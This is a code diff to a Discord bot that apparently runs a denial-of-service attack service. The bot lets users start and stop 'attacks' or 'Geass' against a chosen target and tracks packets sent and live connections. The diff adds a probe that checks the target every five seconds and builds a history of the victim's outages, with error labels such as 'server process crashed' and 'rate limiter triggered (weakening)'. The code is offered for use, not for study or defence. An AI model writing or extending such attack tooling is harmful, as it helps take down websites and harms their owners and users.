@@ -28,6 +28,7 @@ import {
   buildMethodsEmbed,
   buildHelpEmbed,
   buildErrorEmbed,
+  type ProbeResult,
 } from "./embeds.js";
 
 if (!BOT_TOKEN) {
@@ -160,26 +161,95 @@ async function deployCommands(): Promise<void> {
   }
 }
 
-// ── Live attack monitor ───────────────────────────────────────────────────────
-const monitors    = new Map<number, NodeJS.Timeout>();
-const prevPackets = new Map<number, number>();
+// ── Target probe helper ───────────────────────────────────────────────────────
+async function probeTarget(rawUrl: string): Promise<ProbeResult> {
+  let url = rawUrl.trim();
+  if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
+  const t0 = Date.now();
+  try {
+    const ctrl  = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), 8000);
+    const res   = await fetch(url, {
+      method:   "HEAD",
+      redirect: "follow",
+      signal:   ctrl.signal,
+      headers:  { "User-Agent": "Mozilla/5.0 (compatible; monitor/1.0)" },
+    });
+    clearTimeout(timer);
+    const latencyMs = Date.now() - t0;
+    if (res.status >= 500) {
+      return { up: false, latencyMs, reason: `HTTP ${res.status} — origin server error` };
+    }
+    if (res.status === 429) {
+      return { up: false, latencyMs, reason: `HTTP 429 — rate limiter triggered (weakening)` };
+    }
+    return { up: true, latencyMs };
+  } catch (err: unknown) {
+    const latencyMs = Date.now() - t0;
+    const msg = err instanceof Error ? err.message : String(err);
+    if (msg.includes("abort") || msg.includes("timeout") || msg.includes("The operation was aborted")) {
+      return { up: false, latencyMs, reason: "Connection timed out — target unresponsive" };
+    }
+    if (msg.includes("ECONNREFUSED") || msg.includes("refused")) {
+      return { up: false, latencyMs, reason: "Connection refused — server process crashed" };
+    }
+    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
+      return { up: false, latencyMs, reason: "Connection reset — kernel socket buffer overflow" };
+    }
+    if (msg.includes("ENOTFOUND") || msg.includes("NXDOMAIN")) {
+      return { up: false, latencyMs, reason: "DNS resolution failed — target unreachable" };
+    }
+    return { up: false, latencyMs, reason: `Network error: ${msg.slice(0, 80)}` };
+  }
+}
 
-function startMonitor(attackId: number, msg: Message): void {
+// ── Live attack monitor ───────────────────────────────────────────────────────
+const monitors       = new Map<number, NodeJS.Timeout>();
+const prevPackets    = new Map<number, number>();
+const targetHistories = new Map<number, ProbeResult[]>();  // attackId → probe history
+
+function startMonitor(attackId: number, msg: Message, target: string): void {
   if (monitors.has(attackId)) return;
   const INTERVAL_SEC = 5;
+  targetHistories.set(attackId, []);  // init empty history
+
   const tick = setInterval(async () => {
-    const [attack, live] = await Promise.all([
+    // Probe target + fetch attack state + live conns all in parallel
+    const [attack, live, probe] = await Promise.all([
       api.getAttack(attackId),
       api.getLiveConns(attackId).catch(() => ({ conns: 0, running: false })),
+      probeTarget(target).catch(() => ({ up: false, latencyMs: 9999, reason: "probe error" } as ProbeResult)),
     ]);
-    if (!attack) { clearInterval(tick); monitors.delete(attackId); prevPackets.delete(attackId); return; }
+
+    if (!attack) {
+      clearInterval(tick);
+      monitors.delete(attackId);
+      prevPackets.delete(attackId);
+      targetHistories.delete(attackId);
+      return;
+    }
+
+    // Maintain rolling history (max 30 probes = 2.5 min of history, shows last 20 in sparkline)
+    const history = targetHistories.get(attackId) ?? [];
+    history.push(probe);
+    if (history.length > 30) history.shift();
+    targetHistories.set(attackId, history);
+
     const prev    = prevPackets.get(attackId) ?? attack.packetsSent;
     const delta   = Math.max(0, attack.packetsSent - prev);
     const livePps = delta / INTERVAL_SEC;
     prevPackets.set(attackId, attack.packetsSent);
-    try { await msg.edit({ embeds: [buildAttackEmbed(attack, livePps, live?.conns ?? 0)] }); } catch { /**/ }
+
+    try {
+      await msg.edit({ embeds: [buildAttackEmbed(attack, livePps, live?.conns ?? 0, history)] });
+    } catch { /**/ }
+
     if (attack.status !== "running") {
-      clearInterval(tick); monitors.delete(attackId); prevPackets.delete(attackId);
+      clearInterval(tick);
+      monitors.delete(attackId);
+      prevPackets.delete(attackId);
+      // Keep history for a final render, then clean up after 30s
+      setTimeout(() => targetHistories.delete(attackId), 30_000);
     }
   }, INTERVAL_SEC * 1000);
   monitors.set(attackId, tick);
@@ -397,7 +467,7 @@ async function handleGeass(interaction: ChatInputCommandInteraction): Promise<vo
       new ButtonBuilder().setCustomId(`stop_${attack.id}`).setLabel("⏹️ Stop Geass").setStyle(ButtonStyle.Danger),
     );
     const msg = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
-    startMonitor(attack.id, msg as Message);
+    startMonitor(attack.id, msg as Message, target);
   } catch (err: unknown) {
     const message = err instanceof Error ? err.message : String(err);
     await interaction.editReply({ embeds: [buildErrorEmbed("GEASS FAILED", message)] });
@@ -482,7 +552,7 @@ async function handleButton(interaction: import("discord.js").ButtonInteraction)
       );
       const msg = await interaction.editReply({ embeds: [buildStartEmbed(attack)], components: [row] });
       console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
-      startMonitor(attack.id, msg as Message);
+      startMonitor(attack.id, msg as Message, target);
     } catch (err: unknown) {
       const message = err instanceof Error ? err.message : String(err);
       await interaction.editReply({ embeds: [buildErrorEmbed("ATTACK FAILED", message)], components: [] });
